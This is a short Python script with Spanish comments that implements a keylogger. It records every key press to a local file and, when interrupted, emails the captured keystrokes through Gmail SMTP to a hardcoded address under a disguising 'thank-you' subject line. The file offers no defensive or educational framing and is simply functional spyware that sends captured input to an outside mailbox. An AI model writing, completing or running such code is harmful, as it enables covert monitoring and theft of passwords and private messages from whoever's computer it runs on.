import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
import os
import signal
import sys
import time
import numpy as np 
import sys

# Cargar las variables de entorno desde el archivo .env
load_dotenv()

def pressed_keys(key):
    with open('data.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        elif key.name == 'enter':
            file.write('\n')
        elif key.name == 'backspace':
            file.write('<BSP>')
        else:
            file.write(key.name)

def send_email():
    """Envía el correo con el contenido del archivo data.txt"""
    your_email = os.getenv('YOUR_EMAIL')
    your_password = os.getenv('YOUR_PASSWORD')
    recipient = 'santomflo@gmail.com'

    # Crear el mensaje
    message = MIMEMultipart()
    message['From'] = your_email
    message['To'] = recipient
    message['Subject'] = 'Email de agradecimiento'

    # Leer el contenido del archivo y adjuntarlo al mensaje
    with open('data.txt', 'r') as file:
        body = file.read()
    message.attach(MIMEText(body, 'plain'))

    # Enviar el correo
    try:
        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
        smtp_server.starttls()
        smtp_server.login(your_email, your_password)
        smtp_server.sendmail(your_email, recipient, message.as_string())
        smtp_server.quit()
        print('Email enviado')
    except Exception as e:
        print(f'Error al enviar el email: {e}')

def signal_handler(sig, frame):
    """Maneja la señal de interrupción y envía el correo"""
    print('\nInterrupción detectada.')
    send_email()
    sys.exit(0)

# Configurar el manejador de señales
signal.signal(signal.SIGINT, signal_handler)

# Iniciar la grabación de teclas
keyboard.on_press(pressed_keys)

# Esperar indefinidamente hasta que el script sea interrumpido
print("Presiona Ctrl+C para detener el script")
keyboard.wait()